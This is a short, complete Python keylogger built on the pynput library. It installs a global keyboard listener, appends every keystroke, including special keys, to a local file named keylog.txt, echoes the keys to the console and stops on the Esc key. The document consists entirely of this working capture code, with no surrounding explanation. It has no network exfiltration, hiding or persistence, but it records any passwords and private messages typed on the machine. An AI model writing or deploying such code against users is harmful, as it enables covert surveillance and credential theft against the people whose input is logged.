from pynput import keyboard

log_file_path = "keylog.txt"

def on_press(key):
    try:
        key_char = key.char
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key_char}")
        print(key_char, end='', flush=True)
    except AttributeError:
        key_char = f"[{key}]"
        with open(log_file_path, "a") as log_file:
            log_file.write(key_char)
        print(key_char, end='', flush=True)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
